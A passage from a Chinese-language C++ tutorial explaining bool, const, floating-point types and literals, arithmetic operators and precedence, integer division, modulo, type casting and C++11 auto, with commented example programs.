(非零) 转换为 true bool from_int_zero = 0; // 0 转换为 false std::cout &lt;&lt; std::boolalpha; std::cout &lt;&lt; &quot;Bool from 100: &quot; &lt;&lt; from_int_non_zero &lt;&lt; std::endl; // 输出 true std::cout &lt;&lt; &quot;Bool from 0: &quot; &lt;&lt; from_int_zero &lt;&lt; std::endl; // 输出 false // 在条件语句中使用 if (isReady) &#123; std::cout &lt;&lt; &quot;System is ready.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;System is not ready.&quot; &lt;&lt; std::endl; &#125; if (!hasError) &#123; // ! 是逻辑非运算符 std::cout &lt;&lt; &quot;No errors detected.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;An error occurred.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 3.2 const限定符现在我们来探讨一种在C++中创建常量 (Constant) 的更可靠的方法：使用 const 限定符。常量是指在程序运行期间其值不能被修改的量。 const 是一个**类型限定符 (Type Qualifier)**，它用于修改变量的声明，使其成为只读。 作用: 创建符号常量: const 允许你为常量值（如圆周率、最大尝试次数等）赋予一个有意义的名称，提高代码的可读性和可维护性。 防止意外修改: 一旦变量被声明为 const 并初始化后，编译器会阻止任何试图修改该变量值的代码。这有助于防止因意外赋值而导致的错误。 类型安全: 与使用 #define 创建宏常量相比，const 常量具有明确的数据类型，编译器可以对其进行类型检查，更加安全。 作用域: const 常量遵循标准的作用域规则（例如，在函数内部定义的 const 常量只在该函数内有效），而 #define 宏是全局替换。 声明和初始化: 声明 const 变量的语法是在类型名前或类型名后加上 const 关键字。关键在于，const 变量必须在声明时进行初始化，因为之后就不能再给它赋值了。 123const type variableName = value; // 或者type const variableName = value; // 两种写法等效，第一种更常见 用法与示例: 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;int main() &#123; // 声明并初始化 const 变量 const int MONTHS_IN_YEAR = 12; // 常量，表示一年中的月份数 const double PI = 3.14159; const char* GREETING = &quot;Hello, world!&quot;; // 指向常量字符串的常量指针 (更复杂，后续章节详解) // 尝试修改 const 变量会导致编译错误 // MONTHS_IN_YEAR = 13; // 错误! 不能给 const 变量赋值 std::cout &lt;&lt; &quot;Months in a year: &quot; &lt;&lt; MONTHS_IN_YEAR &lt;&lt; std::endl; double radius = 5.0; double circumference = 2 * PI * radius; // 使用 const 常量 PI std::cout &lt;&lt; &quot;Circumference: &quot; &lt;&lt; circumference &lt;&lt; std::endl; // const 常量也遵循作用域规则 if (true) &#123; const int MAX_TRIES = 3; // 只在 if 块内有效 std::cout &lt;&lt; &quot;Max tries inside block: &quot; &lt;&lt; MAX_TRIES &lt;&lt; std::endl; &#125; // std::cout &lt;&lt; MAX_TRIES; // 错误! MAX_TRIES 在此作用域外不可见 // 必须在声明时初始化 // const int DAYS_IN_WEEK; // 错误! const 变量需要初始化 // DAYS_IN_WEEK = 7; return 0;&#125; const 与 #define 的比较: 在 C 语言中，通常使用 #define 预处理器指令来创建符号常量： 1#define MONTHS_IN_YEAR 12 // C 风格宏定义 虽然 #define 也能达到类似目的，但 const 在 C++ 中通常是更好的选择： 类型安全: const 常量有明确的数据类型，编译器会进行类型检查。#define 只是简单的文本替换，没有类型信息，可能导致意外错误。 作用域: const 常量遵循 C++ 的作用域规则，可以创建局部常量。#define 宏通常是全局的（从定义点到文件尾），容易造成命名冲突。 调试: const 常量在调试器中通常可见，有符号名。#define 宏在编译前就被替换掉了，调试时可能只能看到替换后的字面值。 类作用域: const 可以用于定义类作用域内的常量（类成员），而 #define 不能直接做到这一点。 一般建议: 在 C++ 中，优先使用 const 来定义符号常量，而不是 #define。 3.3 浮点数浮点数是C++中用于表示带小数部分的数字（实数）的类型。它们可以表示非常大或非常小的数值，以及整数无法表示的小数。 3.3.1 书写浮点数C++允许使用两种方式来书写浮点字面值（常量）： 标准小数点表示法 (Standard Decimal Point Notation): 包含一个小数点。 例如：12.34, 0.0, 99., .5 (等同于 0.5), -1.67。 E表示法 (E Notation) 或科学记数法 (Scientific Notation): 用于表示非常大或非常小的数。 格式为：mantissaEexponent 或 mantissaeexponent。 mantissa (尾数) 是一个数字（可以带小数点）。 E 或 e 表示 “乘以10的…次幂”。 exponent (指数) 是一个整数（可以为负）。 例如： 3.45E6 表示 3.45 * 106 (即 3,450,000)。 2.5e-4 表示 2.5 * 10-4 (即 0.00025)。 9E12 表示 9 * 1012。 -1.23e+3 表示 -1.23 * 103 (即 -1230)。 注意: E表示法中，E 或 e 前后不能有空格。 指数必须是整数。 用法与示例: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; // 标准小数点表示法 double price = 99.99; double temperature = -15.5; double small_fraction = .25; // 等同于 0.25 // E 表示法 double earth_mass = 5.972E24; // 地球质量 (kg) double electron_charge = -1.602e-19; // 电子电荷 (库仑) double large_number = 1.0e9; // 10 亿 std::cout &lt;&lt; &quot;Price: &quot; &lt;&lt; price &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Temperature: &quot; &lt;&lt; temperature &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Small fraction: &quot; &lt;&lt; small_fraction &lt;&lt; std::endl; // 默认情况下，cout 可能对非常大或小的数自动使用科学记数法输出 std::cout &lt;&lt; &quot;Earth mass: &quot; &lt;&lt; earth_mass &lt;&lt; &quot; kg&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Electron charge: &quot; &lt;&lt; electron_charge &lt;&lt; &quot; C&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Large number: &quot; &lt;&lt; large_number &lt;&lt; std::endl; // 可以使用 &lt;iomanip&gt; 控制输出格式 (后续章节会详细介绍) std::cout.setf(std::ios_base::fixed, std::ios_base::floatfield); // 设置为定点表示法 std::cout &lt;&lt; &quot;Large number (fixed): &quot; &lt;&lt; large_number &lt;&lt; std::endl; return 0;&#125; 3.3.2 浮点类型C++提供了三种浮点类型，它们在精度（有效位数）和存储范围上有所不同： float: 单精度浮点数。通常占用 4 个字节 (32位)。精度较低，范围较小。 double: 双精度浮点数。通常占用 8 个字节 (64位)。精度和范围比 float 大很多。这是C++中最常用的浮点类型，浮点常量（如 3.14）默认就是 double 类型。 long double: 扩展精度浮点数。通常占用 8、10、12 或 16 个字节，具体取决于编译器和系统。提供最高的精度和最大的范围。 精度和范围: 精度 (Precision): 指的是可以表示的有效数字的位数。 float 通常保证至少 6 位有效数字。 double 通常保证至少 15 位有效数字。 long double 通常提供比 double 更高的精度。 范围 (Range): 指的是可以表示的最小和最大数值。double 的范围远大于 float，long double 的范围通常更大。 可以使用 &lt;cfloat&gt; (或 C 语言的 &lt;float.h&gt;) 头文件中的常量来查看具体系统的精度和范围限制（例如 FLT_DIG, DBL_DIG, LDBL_DIG 表示有效位数）。 用法与示例: 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;cfloat&gt; // 包含浮点数限制信息int main() &#123; // 查看各种类型占用的字节数 std::cout &lt;&lt; &quot;Size of float: &quot; &lt;&lt; sizeof(float) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Size of double: &quot; &lt;&lt; sizeof(double) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Size of long double: &quot; &lt;&lt; sizeof(long double) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; std::cout &lt;&lt; std::endl; // 查看精度 (有效位数) std::cout &lt;&lt; &quot;Digits of precision for float: &quot; &lt;&lt; FLT_DIG &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Digits of precision for double: &quot; &lt;&lt; DBL_DIG &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Digits of precision for long double: &quot; &lt;&lt; LDBL_DIG &lt;&lt; std::endl; std::cout &lt;&lt; std::endl; // 声明和初始化 float f_pi = 3.14159265f; // f 后缀表示 float double d_pi = 3.141592653589793; // 默认是 double long double ld_pi = 3.14159265358979323846L; // L 后缀表示 long double std::cout.precision(20); // 设置 cout 输出精度以便观察差异 std::cout &lt;&lt; &quot;float pi: &quot; &lt;&lt; f_pi &lt;&lt; std::endl; std::cout &lt;&lt; &quot;double pi: &quot; &lt;&lt; d_pi &lt;&lt; std::endl; std::cout &lt;&lt; &quot;long double pi: &quot; &lt;&lt; ld_pi &lt;&lt; std::endl; return 0;&#125; 选择建议: 除非有特别的内存或性能考虑，并且确定 float 的精度足够，否则**优先使用 double**。它是C++浮点计算的常用类型。 当需要极高的精度或非常大的数值范围时，使用 long double。 3.3.3 浮点常量浮点常量（字面值）就是直接写在代码中的浮点数值，例如 3.14, 1.0, -2.5e8。 默认类型:默认情况下，C++将不带后缀的浮点常量视为 double 类型。 后缀 (Suffixes):可以通过添加后缀来显式指定浮点常量的类型： f 或 F: 表示 float 类型。 l 或 L: 表示 long double 类型。 用法与示例: 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;typeinfo&gt; // 用于 typeid (仅作演示)int main() &#123; // 默认类型是 double std::cout &lt;&lt; &quot;Type of 3.14: &quot; &lt;&lt; typeid(3.14).name() &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Type of 1.0e-5: &quot; &lt;&lt; typeid(1.0e-5).name() &lt;&lt; std::endl; // 使用后缀指定类型 std::cout &lt;&lt; &quot;Type of 3.14f: &quot; &lt;&lt; typeid(3.14f).name() &lt;&lt; std::endl; // float std::cout &lt;&lt; &quot;Type of 3.14F: &quot; &lt;&lt; typeid(3.14F).name() &lt;&lt; std::endl; // float std::cout &lt;&lt; &quot;Type of 3.14l: &quot; &lt;&lt; typeid(3.14l).name() &lt;&lt; std::endl; // long double std::cout &lt;&lt; &quot;Type of 3.14L: &quot; &lt;&lt; typeid(3.14L).name() &lt;&lt; std::endl; // long double // 赋值时的类型匹配 float price = 99.99f; // 使用 f 后缀避免从 double 到 float 的可能精度损失警告 double weight = 75.5; // 75.5 是 double, 赋值给 double 变量 long double distance = 1.23e10L; // 使用 L 后缀 std::cout &lt;&lt; &quot;Price: &quot; &lt;&lt; price &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Weight: &quot; &lt;&lt; weight &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Distance: &quot; &lt;&lt; distance &lt;&lt; std::endl; return 0;&#125; (注意: typeid().name() 的输出可能因编译器而异，但可以大致看出类型) 在将常量赋给 float 变量时，使用 f 或 F 后缀是一个好习惯，可以避免编译器产生关于从 double 转换到 float 可能丢失精度的警告。 3.3.4 浮点数的优缺点浮点数在表示实数方面非常有用，但也存在一些固有的限制和需要注意的地方。 优点: 表示范围广: 可以表示比整型大得多或小得多的数值。 表示小数: 可以表示整数无法表示的小数部分。 标准化: 大多数现代计算机都遵循 IEEE 754 标准来表示和处理浮点数，这提高了可移植性。 缺点: 精度限制: 浮点数只能近似地表示大多数实数。由于内部使用二进制表示，某些在十进制下看起来很精确的小数（如 0.1）在二进制浮点表示中可能是无限循环小数，只能存储一个近似值。这会导致微小的**舍入误差 (Rounding Error)**。 比较困难: 由于精度限制，直接使用 == 来比较两个浮点数是否相等通常是不可靠的。微小的舍入误差可能导致逻辑上应该相等的两个数在内部表示上略有不同。比较浮点数时，通常应该检查它们的差值是否在一个很小的容差 (Tolerance) 范围内。 运算速度: 浮点运算通常比整型运算慢（尽管现代处理器有专门的浮点单元来优化）。 特殊值: IEEE 754 标准定义了一些特殊值，如 NaN (Not a Number，例如 0.0/0.0 的结果) 和无穷大 (Infinity，例如 1.0/0.0 的结果)，需要在使用时注意处理。 用法与示例 (精度问题和比较): 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;cmath&gt; // 为了 fabs (计算绝对值)#include &lt;iomanip&gt; // 为了 setprecisionint main() &#123; // 精度问题示例 double a = 0.1; double b = 0.2; double sum = a + b; // 理论上应该是 0.3 std::cout &lt;&lt; std::setprecision(20); // 显示更多小数位 std::cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; std::endl; std::cout &lt;&lt; &quot;b = &quot; &lt;&lt; b &lt;&lt; std::endl; std::cout &lt;&lt; &quot;a + b = &quot; &lt;&lt; sum &lt;&lt; std::endl; // 输出可能不是精确的 0.3 if (sum == 0.3) &#123; std::cout &lt;&lt; &quot;Comparison (==): sum is equal to 0.3&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Comparison (==): sum is NOT equal to 0.3&quot; &lt;&lt; std::endl; // 很可能执行这里 &#125; // 正确的比较方法：检查差值是否在容差范围内 const double TOLERANCE = 1e-9; // 定义一个很小的容差值 if (std::fabs(sum - 0.3) &lt; TOLERANCE) &#123; std::cout &lt;&lt; &quot;Comparison (tolerance): sum is close enough to 0.3&quot; &lt;&lt; std::endl; // 应该执行这里 &#125; else &#123; std::cout &lt;&lt; &quot;Comparison (tolerance): sum is NOT close enough to 0.3&quot; &lt;&lt; std::endl; &#125; // 另一个例子 float x = 1.0f / 3.0f; float y = 3.0f * x; std::cout &lt;&lt; &quot;y = 3.0f * (1.0f / 3.0f) = &quot; &lt;&lt; y &lt;&lt; std::endl; // 可能不是精确的 1.0 return 0;&#125; 总结: 在使用浮点数时，要意识到它们是近似值，并避免直接进行相等性比较。在需要精确计算（如金融计算）的场合，可能需要使用专门的库或定点数表示法。对于大多数科学和工程计算，double 提供了足够的精度和范围。 3.4 C++算术运算符C++提供了丰富的运算符来执行算术计算。本节将介绍基本的算术运算符、它们的优先级和结合性、整数除法和求模运算、类型转换以及 C++11 引入的 auto 类型推断。 基本算术运算符: +: 加法 (Addition) -: 减法 (Subtraction) *: 乘法 (Multiplication) /: 除法 (Division) %: 求模 (Modulo) 或求余 (Remainder) 这些运算符可以用于 C++ 的所有数值类型（整型和浮点型），但求模运算符 % 通常只用于整数类型。 用法与示例: 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;int main() &#123; double price = 15.50; double tax_rate = 0.08; int quantity = 3; int total_items = 17; int items_per_box = 5; // 加法 double total_price = price * quantity + 5.0; // 假设有 5 元附加费 std::cout &lt;&lt; &quot;Total price (with fee): &quot; &lt;&lt; total_price &lt;&lt; std::endl; // 减法 double price_before_tax = price / (1 + tax_rate); // 假设 price 已含税 std::cout &lt;&lt; &quot;Price before tax: &quot; &lt;&lt; price_before_tax &lt;&lt; std::endl; // 乘法 double tax_amount = price_before_tax * tax_rate; std::cout &lt;&lt; &quot;Tax amount: &quot; &lt;&lt; tax_amount &lt;&lt; std::endl; // 除法 (浮点数) double average_price = total_price / quantity; std::cout &lt;&lt; &quot;Average price per item: &quot; &lt;&lt; average_price &lt;&lt; std::endl; // 除法 (整数) - 见 3.4.2 int full_boxes = total_items / items_per_box; std::cout &lt;&lt; &quot;Full boxes: &quot; &lt;&lt; full_boxes &lt;&lt; std::endl; // 输出 3 // 求模 - 见 3.4.3 int remaining_items = total_items % items_per_box; std::cout &lt;&lt; &quot;Remaining items: &quot; &lt;&lt; remaining_items &lt;&lt; std::endl; // 输出 2 // 一元减法 (取负) double discount = -10.0; std::cout &lt;&lt; &quot;Discount: &quot; &lt;&lt; discount &lt;&lt; std::endl; // 一元加法 (通常无效果) double positive_value = +price; std::cout &lt;&lt; &quot;Positive value: &quot; &lt;&lt; positive_value &lt;&lt; std::endl; return 0;&#125; 3.4.1 运算符优先级和结合性当一个表达式中包含多个运算符时，优先级 (Precedence) 和 结合性 (Associativity) 决定了运算的执行顺序。 优先级: 哪个运算符先执行。优先级高的运算符先于优先级低的运算符执行。例如，乘法和除法的优先级高于加法和减法。 结合性: 当多个具有相同优先级的运算符连续出现时，它们的执行顺序。 左结合性 (Left-to-Right): 运算从左向右执行。大多数二元算术运算符（+, -, *, /, %）都是左结合的。例如 a - b + c 等价于 (a - b) + c。 右结合性 (Right-to-Left): 运算从右向左执行。赋值运算符 = 和一元运算符（如取负 -）是右结合的。例如 a = b = c 等价于 a = (b = c)。 常见算术运算符优先级 (由高到低): 一元运算符: + (正号), - (负号) - (右结合) 乘法、除法、求模: *, /, % - (左结合) 加法、减法: +, - - (左结合) 赋值运算符: = - (右结合) 使用括号: 可以使用圆括号 () 来覆盖默认的优先级和结合性，强制按特定顺序执行运算。括号内的表达式总是最先计算。 用法与示例: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; int a = 5, b = 8, c = 3, d = 2; // 优先级: * 高于 + int result1 = a + b * c; // 等价于 a + (b * c) = 5 + (8 * 3) = 5 + 24 = 29 std::cout &lt;&lt; &quot;a + b * c = &quot; &lt;&lt; result1 &lt;&lt; std::endl; // 使用括号改变顺序 int result2 = (a + b) * c; // (5 + 8) * 3 = 13 * 3 = 39 std::cout &lt;&lt; &quot;(a + b) * c = &quot; &lt;&lt; result2 &lt;&lt; std::endl; // 结合性 (左结合): / 和 * 优先级相同 int result3 = b / c * d; // 等价于 (b / c) * d = (8 / 3) * d = 2 * d = 2 * 2 = 4 (整数除法) std::cout &lt;&lt; &quot;b / c * d = &quot; &lt;&lt; result3 &lt;&lt; std::endl; // 结合性 (右结合): 赋值 int x, y, z; x = y = z = 10; // 等价于 x = (y = (z = 10)) std::cout &lt;&lt; &quot;x=&quot; &lt;&lt; x &lt;&lt; &quot;, y=&quot; &lt;&lt; y &lt;&lt; &quot;, z=&quot; &lt;&lt; z &lt;&lt; std::endl; // 输出 x=10, y=10, z=10 // 结合性 (右结合): 一元负号 int val = - - 5; // 等价于 -(-5) = 5 std::cout &lt;&lt; &quot;- - 5 = &quot; &lt;&lt; val &lt;&lt; std::endl; return 0;&#125; 建议: 当表达式复杂或优先级不明确时，使用括号来明确运算顺序，可以提高代码的可读性并避免错误。 3.4.2 除法分支C++ 的除法运算符 / 的行为取决于其操作数 (Operand) 的类型： 浮点数除法: 如果操作数中至少有一个是浮点类型 (float, double, long double)，则执行浮点数除法，结果也是浮点类型，包含小数部分。 整数除法: 如果两个操作数都是整数类型 (int, short, long, char, bool 等)，则执行整数除法。结果只保留商的整数部分，小数部分被**截断 (truncated)**（直接丢弃，不是四舍五入）。 用法与示例: 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;int main() &#123; // 浮点数除法 double result_f1 = 9.0 / 5.0; // 两个 double double result_f2 = 9.0 / 5; // 一个 double, 一个 int (int 被提升为 double) double result_f3 = 9 / 5.0; // 一个 int, 一个 double (int 被提升为 double) float result_f4 = 9.0f / 5.0f; // 两个 float std::cout &lt;&lt; &quot;9.0 / 5.0 = &quot; &lt;&lt; result_f1 &lt;&lt; std::endl; // 输出 1.8 std::cout &lt;&lt; &quot;9.0 / 5 = &quot; &lt;&lt; result_f2 &lt;&lt; std::endl; // 输出 1.8 std::cout &lt;&lt; &quot;9 / 5.0 = &quot; &lt;&lt; result_f3 &lt;&lt; std::endl; // 输出 1.8 std::cout &lt;&lt; &quot;9.0f / 5.0f = &quot; &lt;&lt; result_f4 &lt;&lt; std::endl; // 输出 1.8 // 整数除法 int result_i1 = 9 / 5; // 两个 int int result_i2 = 10 / 3; // 两个 int int result_i3 = 13 / 4; // 两个 int int result_i4 = -10 / 3; // 负数整数除法 (结果通常向零截断，为 -3) std::cout &lt;&lt; &quot;9 / 5 = &quot; &lt;&lt; result_i1 &lt;&lt; std::endl; // 输出 1 (小数部分 0.8 被截断) std::cout &lt;&lt; &quot;10 / 3 = &quot; &lt;&lt; result_i2 &lt;&lt; std::endl; // 输出 3 (小数部分 0.333... 被截断) std::cout &lt;&lt; &quot;13 / 4 = &quot; &lt;&lt; result_i3 &lt;&lt; std::endl; // 输出 3 (小数部分 0.25 被截断) std::cout &lt;&lt; &quot;-10 / 3 = &quot; &lt;&lt; result_i4 &lt;&lt; std::endl; // 输出 -3 // 想要得到浮点结果，需要确保至少一个操作数是浮点类型 // 可以使用类型转换 (见 3.4.4) double result_mixed = double(9) / 5; // 将 9 转换为 double std::cout &lt;&lt; &quot;double(9) / 5 = &quot; &lt;&lt; result_mixed &lt;&lt; std::endl; // 输出 1.8 return 0;&#125; 注意: 进行除法运算时，务必清楚操作数的类型，以确保得到期望的结果（整数截断或浮点小数）。 3.4.3 求模运算符求模运算符 % 计算整数除法的**余数 (Remainder)**。它要求两个操作数都必须是整数类型（或可以转换为整数的类型，如 char, bool）。 运算规则:a % b 的结果是 a 除以 b 后的余数。其符号通常与被除数 a 的符号相同（C++11 标准规定如此）。 数学关系:对于整数 a 和 b (其中 b != 0)，以下关系通常成立：(a / b) * b + (a % b) == a 用途: 判断一个数是否能被另一个数整除（如果 a % b == 0，则 a 能被 b 整除）。 获取一个数的最低位数字（num % 10）。 将数值限制在一个范围内（例如，生成 0 到 N-1 之间的数：value % N）。 周期性操作（例如，每隔 M 个元素执行一次操作：if (count % M == 0)）。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;int main() &#123; int total_seconds = 135; int seconds_per_minute = 60; int minutes = total_seconds / seconds_per_minute; // 整数除法得分钟数 int remaining_seconds = total_seconds % seconds_per_minute; // 求模得剩余秒数 std::cout &lt;&lt; total_seconds &lt;&lt; &quot; seconds is &quot; &lt;&lt; minutes &lt;&lt; &quot; minutes and &quot; &lt;&lt; remaining_seconds &lt;&lt; &quot; seconds.&quot; &lt;&lt; std::endl; // 输出 135 seconds is 2 minutes and 15 seconds. // 判断奇偶性 int number = 21; if (number % 2 == 0) &#123; std::cout &lt;&lt; number &lt;&lt; &quot; is even.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; number &lt;&lt; &quot; is odd.&quot; &lt;&lt; std::endl; // 输出 21 is odd. &#125; // 获取个位数 int value = 123; int last_digit = value % 10; std::cout &lt;&lt; &quot;The last digit of &quot; &lt;&lt; value &lt;&lt; &quot; is &quot; &lt;&lt; last_digit &lt;&lt; std::endl; // 输出 3 // 负数求模 (C++11 及以后，结果符号与被除数一致) int result1 = 10 % 3; // 1 int result2 = -10 % 3; // -1 int result3 = 10 % -3; // 1 int result4 = -10 % -3; // -1 std::cout &lt;&lt; &quot;10 % 3 = &quot; &lt;&lt; result1 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;-10 % 3 = &quot; &lt;&lt; result2 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;10 % -3 = &quot; &lt;&lt; result3 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;-10 % -3 = &quot; &lt;&lt; result4 &lt;&lt; std::endl; // 不能用于浮点数 // double remainder = 10.5 % 3.2; // 编译错误! return 0;&#125; 3.4.4 类型转换C++允许在不同数据类型之间进行转换，这称为类型转换 (Type Casting)**。转换可以隐式 (Implicitly)** 发生（由编译器自动完成），也可以显式 (Explicitly) 进行（由程序员通过代码指定）。 隐式类型转换 (Automatic Conversion): 在以下情况下，编译器会自动执行类型转换： 混合类型表达式: 当一个表达式中包含不同数值类型的操作数时，较小或较低优先级的类型通常会被提升 (Promoted) 为较大或较高优先级的类型，然后进行运算。 整型提升 (Integral Promotion): 比 int 小的整型（bool, char, signed char, unsigned char, short, unsigned short）在表达式中通常会被提升为 int (如果 int 能容纳其所有值) 或 unsigned int。 算术转换 (Usual Arithmetic Conversions): 在涉及不同算术类型（整型和浮点型）的运算中，遵循一套规则将操作数转换为共同的类型（通常是两者中“更宽”或精度更高的类型）。例如，int 和 double 运算时，int 会被转换为 double。float 和 double 运算时，float 会被转换为 double。 赋值: 将一个类型的值赋给另一种类型的变量时，右侧的值会被转换为左侧变量的类型。这可能导致精度损失（如 double 转 int）或范围问题（如 long 转 short）。 函数参数传递: 将参数传递给函数时，如果实参类型与形参类型不匹配，会尝试进行转换。 函数返回值: 从函数返回一个值时，如果返回值类型与函数声明的返回类型不匹配，会尝试进行转换。 显式类型转换 (Explicit Casting): 当需要强制进行类型转换，或者为了使代码意图更清晰时，可以使用显式类型转换。C++提供了多种转换方式： C 风格强制类型转换 (C-Style Cast): 12(typeName) expressiontypeName (expression) // 函数式转换 这种方式简单直接，但在某些情况下不够安全，因为它可能执行多种不同类型的转换（如 static_cast, const_cast, reinterpret_cast 的组合）。 C++ 类型转换运算符 (C++ Cast Operators): (更推荐，更安全，意图更明确) static_cast&lt;typeName&gt;(expression): 用于比较“自然”和安全的转换，如数值类型之间的转换（整数与浮点数互转、整数与整数互转）、指针类型之间的相关转换（如 void* 与其他类型指针互转、基类指针与派生类指针互转，但需要谨慎）。这是最常用的 C++ 转换符。 dynamic_cast&lt;typeName&gt;(expression): 主要用于处理类继承层次结构中的指针或引用转换（向下转型），并在运行时进行类型检查。如果转换无效，对于指针会返回 nullptr，对于引用会抛出 std::bad_cast 异常。需要基类是多态的（至少有一个虚函数）。 const_cast&lt;typeName&gt;(expression): 用于添加或移除表达式的 const 或 volatile 限定符。通常用于去除 const，但修改原本是 const 的对象是未定义行为。主要用于处理常量性不匹配的旧 API。 reinterpret_cast&lt;typeName&gt;(expression): 用于低级别的、通常与实现相关的、不安全的转换。例如，在整数和指针之间进行转换，或者在不相关的指针类型之间进行转换。应极力避免使用，除非确实理解其底层含义和风险。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;int main() &#123; // 隐式转换示例 int i_val = 10; double d_val = 3.14; short s_val = 5; // 混合表达式 (算术转换) double result1 = i_val + d_val; // i_val (int) 提升为 double (10.0), 结果是 double (13.14) std::cout &lt;&lt; &quot;int + double = &quot; &lt;&lt; result1 &lt;&lt; std::endl; // 整型提升 char c_val = &#x27;A&#x27;; // ASCII 码 65 int result2 = c_val + s_val; // c_val (char) 和 s_val (short) 都提升为 int, 结果是 int (70) std::cout &lt;&lt; &quot;char + short = &quot; &lt;&lt; result2 &lt;&lt; std::endl; // 赋值转换 (可能丢失信息) int i_from_d = d_val; // d_val (3.14) 转换为 int, 小数部分截断, i_from_d 变为 3 std::cout &lt;&lt; &quot;int from double = &quot; &lt;&lt; i_from_d &lt;&lt; std::endl; short s_from_i = 100000; // 100000 可能超出 short 范围, 结果未定义或回绕 std::cout &lt;&lt; &quot;short from large int = &quot; &lt;&lt; s_from_i &lt;&lt; std::endl; // 显式转换示例 int total = 19; int count = 5; // C 风格转换 (用于浮点除法) double average1 = (double)total / count; double average2 = double(total) / count; // 函数式转换 std::cout &lt;&lt; &quot;(double)total / count = &quot; &lt;&lt; average1 &lt;&lt; std::endl; // 输出 3.8 std::cout &lt;&lt; &quot;double(total) / count = &quot; &lt;&lt; average2 &lt;&lt; std::endl; // 输出 3.8 // C++ static_cast (推荐用于数值转换) double average3 = static_cast&lt;double&gt;(total) / count; std::cout &lt;&lt; &quot;static_cast&lt;double&gt;(total) / count = &quot; &lt;&lt; average3 &lt;&lt; std::endl; // 输出 3.8 int char_code = static_cast&lt;int&gt;(&#x27;B&#x27;); // char 转 int std::cout &lt;&lt; &quot;Code for &#x27;B&#x27;: &quot; &lt;&lt; char_code &lt;&lt; std::endl; // 输出 66 // 演示 reinterpret_cast (通常不推荐) long addr = 1000; // int* ptr = reinterpret_cast&lt;int*&gt;(addr); // 将整数视为地址 (危险!) // std::cout &lt;&lt; &quot;Pointer from address: &quot; &lt;&lt; ptr &lt;&lt; std::endl; return 0;&#125; 建议: 尽量避免不必要的类型转换。 优先使用 C++ 的 static_cast 进行明确且相对安全的数值或相关指针转换。 谨慎使用 C 风格转换，因为它隐藏了转换的类型和风险。 仅在绝对必要且理解后果的情况下使用 const_cast 和 reinterpret_cast。 注意隐式转换可能导致的精度损失或意外行为，尤其是在混合有符号和无符号整数时。 3.4.5 C++11中的auto声明C++11 引入了 auto 关键字，它允许编译器根据变量的初始化表达式 (Initializer) 自动推断出变量的类型。这可以简化代码，尤其是在处理复杂类型（如 STL 迭代器或模板类型）时。 工作原理: 当你使用 auto 声明变量时，必须提供一个初始化表达式。编译器会查看这个表达式的类型，并将该类型赋予 auto 声明的变量。 1auto variableName = initializationExpression; 要点: 必须初始化: 使用 auto 声明的变量必须在声明时初始化。 类型推断: 类型是从初始化表达式推断出来的，而不是变量本身的某种默认类型。 const 和引用: auto 通常不会自动推断出顶层的 const 或引用。如果需要 const 或引用，需要显式添加。 auto x = value; // x 的类型与 value 相同 (const/引用被剥离) const auto cx = value; // cx 是 const 类型 auto&amp; rx = value; // rx 是引用类型 const auto&amp; crx = value; // crx 是 const 引用类型 列表初始化: 对于 C++11 中的列表初始化 &#123;&#125;，auto 的推断规则比较特殊。 auto x = &#123;1, 2, 3&#125;; // C++11/14: x 被推断为 std::initializer_list auto y = &#123;1&#125;; // C++11/14: y 被推断为 std::initializer_list auto z&#123;1&#125;; // C++17: z 被推断为 int (注意没有等号) 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;iostream&gt;#include &lt;vector&gt; // 包含 vector#include &lt;typeinfo&gt; // 用于 typeid (仅作演示)int main() &#123; // 基本类型推断 auto i = 10; // i 被推断为 int auto d = 3.14; // d 被推断为 double auto f = 3.14f; // f 被推断为 float auto c = &#x27;A&#x27;; // c 被推断为 char auto b = true; // b 被推断为 bool auto ll = 1234567890LL; // ll 被推断为 long long std::cout &lt;&lt; &quot;Type of i: &quot; &lt;&lt; typeid(i).name() &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Type of d: &quot; &lt;&lt; typeid(d).name() &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Type of f: &quot; &lt;&lt; typeid(f).name() &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Type of ll: &quot; &lt;&lt; typeid(ll).name() &lt;&lt; std::endl; // 推断表达式结果类型 auto sum = i + d; // i(int) + d(double) -&gt; double, sum 被推断为 double std::cout &lt;&lt; &quot;Type of sum: &quot; &lt;&lt; typeid(sum).name() &lt;&lt; std::endl; std::cout &lt;&lt; &quot;sum = &quot; &lt;&lt; sum &lt;&lt; std::endl; // 推断 const 和引用 (需要显式添加) int original = 100; 